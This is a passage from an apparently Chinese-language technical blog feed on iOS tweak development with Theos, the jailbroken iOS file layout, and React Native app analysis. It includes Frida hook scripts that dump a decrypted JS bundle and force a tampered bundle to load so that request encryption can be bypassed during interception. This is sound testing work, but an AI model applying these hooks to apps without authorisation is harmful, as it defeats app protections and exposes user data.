class="hljs-keyword">void</span> **)&amp;orginal_AudioServicesPlaySystemSound);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-dtor"><a href="#5-dtor" class="headerlink" title="5.%dtor"></a>5.%dtor</h3><p>Generate an anonymous deconstructor (of default priority).</p><h3 id="6-log"><a href="#6-log" class="headerlink" title="6.%log"></a>6.%log</h3><p>该指令在%hook内部使用，将函数的类名、参数等信息写入syslog,可以％log([(),…..])的格式追加其他打印信息。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> SpringBorad<br>-<span class="ruby"> (void)<span class="hljs-symbol">_menuButtonDown:</span>(id)down</span><br><span class="ruby"></span>&#123;<br><span class="hljs-tag">    %<span class="hljs-selector-tag">log</span>((NSString *)</span>@&quot;iosre&quot;,(NSString *)@&quot;Debug&quot;);<br><span class="hljs-tag">    %<span class="hljs-selector-tag">orig</span></span>; // 调用原始的_menuButtonDown方法<br>&#125;<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br></code></pre></td></tr></table></figure><h3 id="7-orig"><a href="#7-orig" class="headerlink" title="7.%orig"></a>7.%orig</h3><p>该指令在%hook内部使用，执行被hook的函数的原始代码；也可以用％orig更改原始函数的参数。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> SpringBorad<br>-<span class="ruby"> (void)<span class="hljs-symbol">setCustomSubtitleText:</span>(id)arg1 <span class="hljs-symbol">withColor:</span>   (id)arg2</span><br><span class="ruby"></span>&#123;<br><span class="hljs-tag">    %<span class="hljs-selector-tag">orig</span>(@&quot;change arg2&quot;,arg2)</span>;// 将arg2的参数修 改为&quot;change arg2&quot;<br>&#125;<br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br></code></pre></td></tr></table></figure><h3 id="8-init"><a href="#8-init" class="headerlink" title="8.%init"></a>8.%init</h3><p>该指令用于初始化某个％group，必须在%hook或％ctor内调用；如果带参数，则初始化指定的group，如果不带参数，则初始化_ungrouped. </p><p>注： 切记，只有调用了％init,对应的%group才能起作用！</p><h3 id="9-c"><a href="#9-c" class="headerlink" title="9.%c"></a>9.%c</h3><p>该指令的作用等同于objc_getClass或NSClassFromString,即动态获取一个类的定义，在%hook或％ctor内使用 。</p><p>调用ViewController中的Method方法</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">[[[%c(ViewController) alloc ] init]<span class="hljs-function"><span class="hljs-keyword">Method</span>];</span> <br></code></pre></td></tr></table></figure><h2 id="日志打印"><a href="#日志打印" class="headerlink" title="日志打印"></a>日志打印</h2><p>hook demo方法并添加打印入参</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"> <br><span class="hljs-meta">#import <span class="hljs-meta-string">&quot;ViewController.h&quot;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">ViewController</span> ()</span><br> <span class="hljs-comment">//点击事件</span><br>- (<span class="hljs-keyword">IBAction</span>)compute;<br><br><span class="hljs-keyword">@end</span><br><br><span class="hljs-class"><span class="hljs-keyword">@implementation</span> <span class="hljs-title">ViewController</span></span><br><br>- (<span class="hljs-keyword">void</span>)viewDidLoad &#123;<br>    [<span class="hljs-keyword">super</span> viewDidLoad];<br>    <span class="hljs-comment">// Do any additional setup after loading the view.</span><br>    <br>&#125;<br> <br>- (<span class="hljs-keyword">IBAction</span>)compute &#123;<br>    <br>    [<span class="hljs-keyword">self</span> demo:<span class="hljs-string">@&quot;66&quot;</span>];<br>    <br>&#125;<br> <br>- (<span class="hljs-keyword">void</span>)demo:(<span class="hljs-built_in">NSString</span> *)str&#123;<br>   <span class="hljs-built_in">NSString</span> *res = [str stringByAppendingString:<span class="hljs-string">@&quot;🐂🐂🐂&quot;</span>];<br>    <span class="hljs-built_in">NSLog</span>(res);<br>  <br>    <br>&#125;<br><span class="hljs-keyword">@end</span><br><br></code></pre></td></tr></table></figure><p>logify.pl生成.xm文件</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//根据class-dump后的ViewController.h生成.x文件</span><br>logify.pl <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ViewController</span>.</span></span>h &gt;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Tweak</span>.</span></span>x<br></code></pre></td></tr></table></figure><p>我们之关系程序中自己写的方法</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-comment">//经过删减过后的Tweak.x文件</span><br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">hook</span></span> ViewController<br> <br>-<span class="ruby"> (void)<span class="hljs-symbol">demo:</span>(id)arg1 &#123; %log; %orig; &#125;</span><br><span class="ruby"></span><span class="hljs-tag"> </span><br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br><br></code></pre></td></tr></table></figure><p>将生成的Tweak.x文件替换theos生成的Tweak.x文件后编译安装即可</p><p>查看打印日志</p> <img src="/2021/08/22/iOS-Tweak/images/logify.png" class="">]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hook</tag>
      
      <tag>iOS</tag>
      
      <tag>tweak</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IOS文件结构</title>
    <link href="/2021/08/22/IOS%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    <url>/2021/08/22/IOS%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>目录结构</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs coq">/<br>|<br><span class="hljs-type">---Developer</span>/<br>|<br><span class="hljs-type">---Applications</span>/<br>|<br><span class="hljs-type">---Library</span>/<br>|<br><span class="hljs-type">---System</span>/<br>|<br><span class="hljs-type">---bin</span>/<br>|<br><span class="hljs-type">---sbin</span>/<br>|<br><span class="hljs-type">---boot</span>/<br>|<br><span class="hljs-type">---cores</span>/<br>|<br><span class="hljs-type">---dev</span>/<br>|<br><span class="hljs-type">---usr</span>/<br>|<br><span class="hljs-type">---lib</span>/<br>|<br><span class="hljs-type">---mnt</span>/<br>|<br><span class="hljs-type">---tmp</span> -&gt; private/var/tmp/<br>|<br><span class="hljs-type">---etc</span> -&gt; private/etc/<br>|<br><span class="hljs-type">---User</span> -&gt; /var/mobile/<br>|<br><span class="hljs-type">---var</span> -&gt; private/var/<br>|<br><span class="hljs-type">---private</span>/<br></code></pre></td></tr></table></figure><h2 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h2><h3 id="1-Developer"><a href="#1-Developer" class="headerlink" title="1. /Developer"></a>1. /Developer</h3><pre><code>开发者相关库、工具</code></pre><h3 id="2-Applications"><a href="#2-Applications" class="headerlink" title="2. /Applications"></a>2. /Applications</h3><pre><code>系统APP</code></pre><h3 id="3-Library"><a href="#3-Library" class="headerlink" title="3. /Library"></a>3. /Library</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">用户缓存数据<br></code></pre></td></tr></table></figure><p>越狱相关文件会存放该目录下</p><p>3.1 /Library/dpkg <code>cydia dpkg目录</code></p><pre><code>安装插件使用的文件路径、插件卸载脚本、插件签名/var/lib/dpkg/infoinfo|--- re.frida.server.list 所使用的文件|--- re.frida.server.md5sums 签名|--- re.frida.server.prerm 卸载脚本</code></pre><p>3.2 /Library/LaunchDaemons  <code>越狱后添加后台运行程序,以plist文件形式存放</code></p><p>3.3 /Library/MobileSubstrate <code>越狱插件相关目录</code></p><pre><code>/Library/MobileSubstrate/DynamicLibraries 越狱插件安装目录,结构如下DynamicLibraries |---inject.plist|---inject.dylibplist文件中包含要hook的app或组件的信息，cydia负责将对应的dylib加载到hook的进程中</code></pre><p> 3.4 /Library/PreferenceBundles <code>越狱插件的界面，如FlyJB会在设置中有个设置界面，对应该目录下的资源文件,注:要想使用界面功能需要先安装P  referenceLoader插件</code></p><p> 3.5 /Library/PreferenceLoader/Preferences <code>越狱插件的用户偏好设置</code></p><p> 3.6 /Library/Ringtones <code>系自带的来电铃声存放目录(ACC文件结构)</code></p><h3 id="4-System"><a href="#4-System" class="headerlink" title="4.  /System"></a>4.  /System</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">系统缓存数据、库文件<br></code></pre></td></tr></table></figure><p>4.1 /System/Library/LaunchDaemons</p><pre><code>设置系统守护进程目录，plist文件设置</code></pre><p>4.1 /System/Library/Frameworks   /System/Library/PrivateFrameworks</p><pre><code>系统动态库</code></pre><h3 id="5-bin-sbin"><a href="#5-bin-sbin" class="headerlink" title="5. /bin  /sbin"></a>5. /bin  /sbin</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">命令<br></code></pre></td></tr></table></figure><h3 id="6-boot"><a href="#6-boot" class="headerlink" title="6. /boot"></a>6. /boot</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">引导相关，该文件夹为空<br></code></pre></td></tr></table></figure><h3 id="7-dev"><a href="#7-dev" class="headerlink" title="7. /dev"></a>7. /dev</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">设备文件<br></code></pre></td></tr></table></figure><h3 id="8-usr"><a href="#8-usr" class="headerlink" title="8. /usr"></a>8. /usr</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">系统核心库、命令<br></code></pre></td></tr></table></figure><p>8.1  /usr/lib/substrate <code>越狱核心库文件</code></p><pre><code>substrate|--- SubstrateBootstrap.dylib|--- SubstrateInserter.dylib|--- SubstrateLoader.dylib运行APP会加载3个dylib</code></pre><h3 id="9-tmp"><a href="#9-tmp" class="headerlink" title="9. /tmp"></a>9. /tmp</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">软连接到 <span class="hljs-regexp">/private/</span>tmp/<br></code></pre></td></tr></table></figure><h3 id="10-etc"><a href="#10-etc" class="headerlink" title="10. /etc"></a>10. /etc</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">软连接到 <span class="hljs-regexp">/private/</span>etc/<br></code></pre></td></tr></table></figure><h3 id="11-User"><a href="#11-User" class="headerlink" title="11. /User"></a>11. /User</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">软件接到 <span class="hljs-regexp">/var/m</span>obile/<br></code></pre></td></tr></table></figure><h3 id="12-var"><a href="#12-var" class="headerlink" title="12. /var"></a>12. /var</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">软件接到 <span class="hljs-keyword">private</span>/<span class="hljs-keyword">var</span><br></code></pre></td></tr></table></figure><h3 id="13-private"><a href="#13-private" class="headerlink" title="13. /private"></a>13. /private</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">核心文件系统<br></code></pre></td></tr></table></figure><p>13.1 /private/etc <code>配置文件</code></p><p>13.2 /private/system_data <code>空文件夹</code></p><p>13.3 /private/xarts <code>unknow</code></p><p>13.4 /private/var</p><pre><code>系统核心目录，root、mobile家目录、app安装目录、用户数据、存储.........都在该目录下</code></pre><h2 id="private-var目录"><a href="#private-var目录" class="headerlink" title="/private/var目录"></a>/private/var目录</h2><h3 id="1-Keychains"><a href="#1-Keychains" class="headerlink" title="1. Keychains"></a>1. Keychains</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Keychains</span> 加密后数据<br></code></pre></td></tr></table></figure><p>   1.1  /var/Keychains/keychain-2.db</p><pre><code>存放加密后数据</code></pre><p>1.2 /var/Keychains/TrustStore.sqlite3</p><pre><code>导入证书数据</code></pre><h3 id="2-MobileDevice"><a href="#2-MobileDevice" class="headerlink" title="2. MobileDevice"></a>2. MobileDevice</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">描述文件<br></code></pre></td></tr></table></figure><p>2.1 /var/MobileDevice/ProvisioningProfiles</p><pre><code>安装的描述文件</code></pre><h3 id="3-MobileSoftwareUpdate"><a href="#3-MobileSoftwareUpdate" class="headerlink" title="3. MobileSoftwareUpdate"></a>3. MobileSoftwareUpdate</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">系统升级相关<br></code></pre></td></tr></table></figure><h3 id="4-binpack"><a href="#4-binpack" class="headerlink" title="4. binpack"></a>4. binpack</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">checkra</span>越狱后的checkra<span class="hljs-number">1</span>n APP安装目录<br></code></pre></td></tr></table></figure><h3 id="5-cache"><a href="#5-cache" class="headerlink" title="5. cache"></a>5. cache</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">缓存目录，apt会缓存数据到该目录<br></code></pre></td></tr></table></figure><h3 id="6-containers"><a href="#6-containers" class="headerlink" title="6. containers"></a>6. containers</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">用户<span class="hljs-keyword">APP</span>安装目录、共享数据<br></code></pre></td></tr></table></figure><p>6.1 /var/containers/Bundle/Application</p><pre><code>用户APP安装目录</code></pre><p>6.2 /var/containers/Shared</p><pre><code>    APP共享数据目录</code></pre><h3 id="7-db"><a href="#7-db" class="headerlink" title="7. db"></a>7. db</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">系统文件，铃声，壁纸，系统设置，界面，ui<br></code></pre></td></tr></table></figure><h3 id="8-installd"><a href="#8-installd" class="headerlink" title="8. installd"></a>8. installd</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">安装APP，安装APP时可能会先缓存到<span class="hljs-regexp">/var/i</span>nstalld<span class="hljs-regexp">/Library/</span>Caches/com.apple.mobile.installd.staging<br></code></pre></td></tr></table></figure><h3 id="9-keybags"><a href="#9-keybags" class="headerlink" title="9. keybags"></a>9. keybags</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">锁屏密码相关<br></code></pre></td></tr></table></figure><h3 id="10-lib"><a href="#10-lib" class="headerlink" title="10. lib"></a>10. lib</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">cydia相关文件<br></code></pre></td></tr></table></figure><p>10.1 /var/lib/apt <code>apt相关文件</code></p><p>10.2 /var/lib/cydia/firmware.ver <code>cydia版本</code></p><p>10.3 /var/lib/dpkg <code>软链接到/Library/dpkg</code></p><h3 id="11-log-logs"><a href="#11-log-logs" class="headerlink" title="11. log logs"></a>11. log logs</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">日志相关<br></code></pre></td></tr></table></figure><h3 id="12-networkd"><a href="#12-networkd" class="headerlink" title="12. networkd"></a>12. networkd</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">网络相关<br></code></pre></td></tr></table></figure><h3 id="13-preferences"><a href="#13-preferences" class="headerlink" title="13. preferences"></a>13. preferences</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">偏好设置<br></code></pre></td></tr></table></figure><h3 id="14-run"><a href="#14-run" class="headerlink" title="14. run"></a>14. run</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">UNKNOW</span><br></code></pre></td></tr></table></figure><h3 id="15-vm"><a href="#15-vm" class="headerlink" title="15. vm"></a>15. vm</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">虚拟内存<br></code></pre></td></tr></table></figure><h3 id="16-wireless"><a href="#16-wireless" class="headerlink" title="16. wireless"></a>16. wireless</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">UNKNOW</span><br></code></pre></td></tr></table></figure><h3 id="17-tmp"><a href="#17-tmp" class="headerlink" title="17. tmp"></a>17. tmp</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">临时文件<br></code></pre></td></tr></table></figure><h3 id="18-root"><a href="#18-root" class="headerlink" title="18. root"></a>18. root</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">root用户家目录<br></code></pre></td></tr></table></figure><h3 id="19-mobile"><a href="#19-mobile" class="headerlink" title="19. mobile"></a>19. mobile</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">mobile用户家目录<br></code></pre></td></tr></table></figure><p>19.1 Documents <code>mobile用户文档,CrackerXI会脱壳到该目录下</code></p><p>19.2 Media <code>相册、电子书、录音等</code></p><pre><code>相册照片/var/mobile/Media/DCIMiTunes上传的多媒体文件目录/var/mobile/Media/iTunes_Control照片里的图片/var/mobile/Media/Photos语音备忘录/var/mobile/Media/Recordings</code></pre><p>​    </p><p>19.3 Library <code>mobile用户缓存数据</code></p><pre><code>APP安装后生成的安装路径、沙箱目录名称 会存储在该DB/var/mobile/Library/FrontBoard/applicationState.db存储通讯录/var/mobile/Library/AddressBook存储短信/var/mobile/Library/SMS存储备忘录/var/mobile/Library//var/mobile/Library</code></pre><p>19.4 Containers <code>APP沙箱、共享数据等</code></p><pre><code>APP沙箱目录/var/mobile/Containers/Data/Application/xxxxAPP沙箱目录|--- Documents 文档目录,存储一些文件|--- Library 缓存数据|   ||   --- Caches 缓存|   ||   --- Preferences 用户偏好设置，一般该目录下会存在.plist|   | |   --- Cookies 使用WebKit时cookie存储路径|   ||   --- WebKit/WebsiteData  H5本地缓存数据、IndexedDB、WebSQL等|   ||   --- SplashBoard/Snapshots 挂起快照,启动图缓存|   ||   --- .....|--- SystemData APP运行产生的数据一般很少使用|--- tmp  临时文件</code></pre><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>iOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReactNative分析</title>
    <link href="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/"/>
    <url>/2021/08/22/ReactNative%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>React Native (简称RN)是Facebook于2015年4月开源的跨平台移动应用开发框架，是Facebook早先开源的JS框架 React 在原生移动应用平台的衍生产物，支持iOS和安卓两大平台</p><h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2. 分析"></a>2. 分析</h2><p>核心代码为js编写，在安装包assest目录下存放index.android.bundle（有可能重命名，因为rn本身仅仅做了混淆，使用编辑器打开即可分析js代码。</p><p>注：部分APP可能会将index.android.bundle加密，运行时解密加载</p><h3 id="2-1-数据解密"><a href="#2-1-数据解密" class="headerlink" title="2.1 数据解密"></a>2.1 数据解密</h3><h4 id="2-1-1-通过请求包关键字定位到加密点"><a href="#2-1-1-通过请求包关键字定位到加密点" class="headerlink" title="2.1.1 通过请求包关键字定位到加密点"></a>2.1.1 通过请求包关键字定位到加密点</h4> <img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/%E5%AE%9A%E4%BD%8D%E5%88%B0%E5%8A%A0%E5%AF%86%E7%82%B9.png" class=""><h4 id="2-1-2-新建js文件，复制strEnc、strDec方法和相关依赖方法，并使用node运行解密"><a href="#2-1-2-新建js文件，复制strEnc、strDec方法和相关依赖方法，并使用node运行解密" class="headerlink" title="2.1.2 新建js文件，复制strEnc、strDec方法和相关依赖方法，并使用node运行解密"></a>2.1.2 新建js文件，复制strEnc、strDec方法和相关依赖方法，并使用node运行解密</h4> <img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/node%E5%AE%9E%E7%8E%B0%E5%8A%A0%E8%A7%A3%E5%AF%86.png" class=""><h4 id="2-1-3编写burp插件，java调用js加解密方法"><a href="#2-1-3编写burp插件，java调用js加解密方法" class="headerlink" title="2.1.3编写burp插件，java调用js加解密方法"></a>2.1.3编写burp插件，java调用js加解密方法</h4><p>xxxxx</p><h3 id="2-2-bundle代码篡改"><a href="#2-2-bundle代码篡改" class="headerlink" title="2.2 bundle代码篡改"></a>2.2 bundle代码篡改</h3><p>对于非对称加密需要将bundle中的公钥进行替换，所以需要对bundle进行篡改。<br>index.android.bundle中的js最终是需要被load到内存中，所以在某一时刻是可以获取，将load前的index.android.bundle进行篡改。</p><h4 id="2-2-1-分析rn加载流程"><a href="#2-2-1-分析rn加载流程" class="headerlink" title="2.2.1 分析rn加载流程"></a>2.2.1 分析rn加载流程</h4><p><strong>com.facebook.react.ReactNativeHost.createReactInstanceManager</strong>方法</p><img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/createReactInstanceManager.png" class=""><p>如上图 <strong>小1</strong> 由用户指定bundle路径，一般来说如果bundle加密了，解密后会将jSBundleFile设置为bundle解密后文件路径，由RN负责加载，此时可以HOOK该方法，进行解密后的bundle dump。</p><p>进入<strong>jSBundleFile</strong>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ReactInstanceManagerBuilder <span class="hljs-title">setJSBundleFile</span><span class="hljs-params">(String str)</span> </span>&#123;<br><br>    <span class="hljs-keyword">if</span> (!str.startsWith(<span class="hljs-string">&quot;assets://&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> setJSBundleLoader(JSBundleLoader.createFileLoader(str));<br>    &#125;<br>    <span class="hljs-keyword">this</span>.mJSBundleAssetUrl = str;<br>    <span class="hljs-keyword">this</span>.mJSBundleLoader = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>  解密后的文件路径固然不能是assets开头的，所以会走setJSBundleLoader流程</p><p>  dump bundle脚本，获取到bundle文件后即可进行篡改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> ReactInstanceManagerBuilder = Java.use(<span class="hljs-string">&quot;com.facebook.react.ReactInstanceManagerBuilder&quot;</span>);<br>ReactInstanceManagerBuilder.setJSBundleFile.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">path</span>) </span>&#123;<br>   <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;bundle path is :&quot;</span>,path);<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">this</span>.setJSBundleFile(path);<br>&#125;;<br></code></pre></td></tr></table></figure><p>如上图 <strong>小2</strong> 如果用户未指定jSBundleFile，则默认调用setBundleAssetName方法，如下图会加载assets路径下的<strong>index.android.bundle</strong>(这也是为什么app资源路径下bundle默认名为index.android.bundle的原因)</p><img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/setBundleAssetName.png" class=""><h4 id="2-2-2-篡改bundle"><a href="#2-2-2-篡改bundle" class="headerlink" title="2.2.2 篡改bundle"></a>2.2.2 篡改bundle</h4><h5 id="2-2-2-1-将index-android-bundle中的加密方法删除"><a href="#2-2-2-1-将index-android-bundle中的加密方法删除" class="headerlink" title="2.2.2.1 将index.android.bundle中的加密方法删除"></a>2.2.2.1 将index.android.bundle中的加密方法删除</h5><img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/%E7%AF%A1%E6%94%B9bundle.png" class=""><h5 id="2-2-2-2-push至手机sd卡下"><a href="#2-2-2-2-push至手机sd卡下" class="headerlink" title="2.2.2.2 push至手机sd卡下"></a>2.2.2.2 push至手机sd卡下</h5><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">adb</span> <span class="hljs-keyword">push</span> xxxx /sdcard<br></code></pre></td></tr></table></figure><h5 id="2-2-2-3-HOOK-setBundleAssetName，load修改后bundle"><a href="#2-2-2-3-HOOK-setBundleAssetName，load修改后bundle" class="headerlink" title="2.2.2.3 HOOK setBundleAssetName，load修改后bundle"></a>2.2.2.3 HOOK setBundleAssetName，load修改后bundle</h5><p>因为setBundleAssetName方法会对当前入参路径拼接assets://，所以在该方法下不能简单的HOOK修改入参（bundle路径），故HOOK该方法，篡改代码逻辑，强制走上面分析中的<strong>小1</strong>流程</p><p>frida hook脚本如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> ReactInstanceManagerBuilder = Java.use(<span class="hljs-string">&quot;com.facebook.react.ReactInstanceManagerBuilder&quot;</span>);<br><span class="hljs-keyword">var</span> JSBundleLoader = Java.use(<span class="hljs-string">&quot;com.facebook.react.bridge.JSBundleLoader&quot;</span>)<br>ReactInstanceManagerBuilder.setBundleAssetName.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">path</span>) </span>&#123;<br><br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;bundle path is :&quot;</span>,path);<br>    <span class="hljs-keyword">var</span> newPath = <span class="hljs-string">&quot;/storage/emulated/0/index.android.bundle&quot;</span>;<br>   <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.setJSBundleLoader(JSBundleLoader.$new().createFileLoader(newPath));<br>&#125;;<br></code></pre></td></tr></table></figure><p>burp抓包未篡改js与篡改js后请求包对比</p><p>未篡改，数据已加密</p><img 